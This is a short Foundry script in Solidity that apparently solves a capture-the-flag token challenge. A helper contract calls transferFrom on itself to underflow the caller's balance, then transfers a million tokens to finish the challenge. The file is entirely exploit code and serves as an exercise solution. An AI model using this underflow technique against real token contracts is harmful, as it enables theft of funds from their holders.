// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.16;

import "forge-std/Script.sol";

interface IChallenge {
    function isComplete() external returns (bool);
    function approve(address spender, uint256 value) external;
    function transfer(address to, uint256 value) external;
    function transferFrom(address from, address to, uint256 value) external;
}

contract ExploitScript is Script {
    function run(address instanceAddress) public {
        vm.startBroadcast();
        Exploit exploit = new Exploit();
        IChallenge(instanceAddress).approve(address(exploit), type(uint256).max);
        exploit.exploit(instanceAddress);
        require(IChallenge(instanceAddress).isComplete());
    }
}

contract Exploit {
    constructor() {}

    function exploit(address instanceAddress) public {
        IChallenge(instanceAddress).transferFrom(msg.sender, msg.sender, 1);
        IChallenge(instanceAddress).transfer(msg.sender, 1000000);
    }
}
